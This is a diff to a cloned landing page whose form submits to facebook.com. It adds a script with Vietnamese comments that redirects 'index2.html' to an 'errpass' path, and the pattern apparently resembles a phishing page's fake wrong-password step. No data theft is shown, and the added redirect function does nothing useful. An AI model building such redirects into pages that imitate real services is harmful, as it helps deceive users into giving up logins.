@@ -742,7 +742,7 @@
         type="text/css" />
     <meta property='og:title' content='' />
     <script
-        type="text/javascript">window.ub = { "page": { "id": "0625f174-183a-4588-9159-67c7fac9bcb1", "variantId": "a", "usedAs": "main", "name": "Jordan!3", "url": "index2.html", "dimensions": { "desktop": { "height": 900, "width": 1186 }, "mobile": { "height": 801, "width": 320 }, "mobileMaxWidth": 600 } }, "hooks": { "beforeFormSubmit": [], "afterFormSubmit": [] } };</script>
+        type="text/javascript">window.ub = { "page": { "id": "0625f174-183a-4588-9159-67c7fac9bcb1", "variantId": "a", "usedAs": "main", "name": "Jordan!3", "url": "hi", "dimensions": { "desktop": { "height": 900, "width": 1186 }, "mobile": { "height": 801, "width": 320 }, "mobileMaxWidth": 600 } }, "hooks": { "beforeFormSubmit": [], "afterFormSubmit": [] } };</script>
     <script
         type="text/javascript">window.ub.form = { "action": "url", "validationRules": { "first_name": { "required": true }, "last_name": { "required": true } }, "validationMessages": { "first_name": {}, "last_name": {} }, "customValidators": {}, "includeFormData": false, "url": "https://www.facebook.com/", "target": "_self", "isConversionGoal": true }; window.module = { lp: { form: { data: window.ub.form } } };</script>
 
@@ -753,6 +753,24 @@
 
     <!-- Open Graph Type -->
     <meta property="og:type" content="website" />
+
+
+    <script>
+        // Kiểm tra nếu URL chứa index.html, chuyển hướng đến URL không có index.html
+        if (window.location.href.indexOf('index2.html') > -1) {
+            window.location.href = window.location.href.replace('index2.html', 'errpass');
+        }
+
+        // Xử lý khi người dùng chuyển qua trang thứ hai
+        function goToSecondPage() {
+            // Lấy đường dẫn hiện tại
+            var currentUrl = window.location.href;
+            // Thêm tên thư mục vào đường dẫn
+            var newUrl = currentUrl;
+            // Chuyển hướng tới trang thứ hai với tên thư mục
+            window.location.href = newUrl;
+        }
+    </script>
 
 
     <script>window.ub = window.ub || {}; window.ub.visitorId = "92c92657-800d-4864-ac8d-0de16a1f5dda"; window.ub.routingStrategy = "single"; window.ub.domain = {};</script>
